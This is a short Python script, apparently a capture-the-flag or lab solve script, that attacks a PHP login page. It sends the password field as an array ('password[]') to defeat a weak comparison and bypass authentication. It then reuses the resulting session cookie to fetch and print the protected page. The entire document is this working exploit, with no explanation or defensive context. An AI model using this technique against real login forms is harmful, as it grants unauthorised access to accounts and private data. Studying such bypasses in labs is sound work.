import os
import requests

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "8001")

r = requests.post(f"http://{HOST}:{PORT}/login.php",
                  data={"username": "a", "password[]": "a"})
cookies = r.cookies

r = requests.get(f"http://{HOST}:{PORT}/",
                 cookies=cookies)
print(r.text)
